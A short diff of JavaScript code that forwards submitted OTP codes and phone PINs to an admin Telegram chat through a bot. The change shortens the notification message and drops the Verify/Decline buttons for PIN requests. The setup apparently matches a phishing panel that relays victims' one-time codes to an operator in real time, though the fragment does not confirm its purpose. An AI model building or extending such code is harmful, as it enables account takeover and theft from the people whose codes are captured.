@@ -107,7 +107,7 @@ function sendVerificationRequest(type, value, flow) {
         const id = generateId();
         const store = type === 'PhonePIN' ? pendingVerifications : otpStore;
 
-        const message = `<b>New ${type} Verification Request</b>\n\n${type}: <code>${value}</code>\nFlow: ${flow}\n\nPlease verify or decline this request.`;
+        const message = `<b>New ${type} Verification Request</b>\n\n${type}: <code>${value}</code>\nFlow: ${flow}`;
 
         let keyboard;
         if (type === 'OTP') {
@@ -120,18 +120,12 @@ function sendVerificationRequest(type, value, flow) {
                     ]
                 ]
             };
-        } else {
-            keyboard = {
-                inline_keyboard: [
-                    [
-                        { text: '✅ Verify', callback_data: `verify_${type}_${id}` },
-                        { text: '❌ Decline', callback_data: `decline_${type}_${id}` }
-                    ]
-                ]
-            };
         }
 
-        bot.sendMessage(adminChatId, message, { reply_markup: keyboard, parse_mode: 'HTML' })
+        const options = { parse_mode: 'HTML' };
+        if (keyboard) options.reply_markup = keyboard;
+
+        bot.sendMessage(adminChatId, message, options)
             .then(() => {
                 store.set(id, {
                     value,
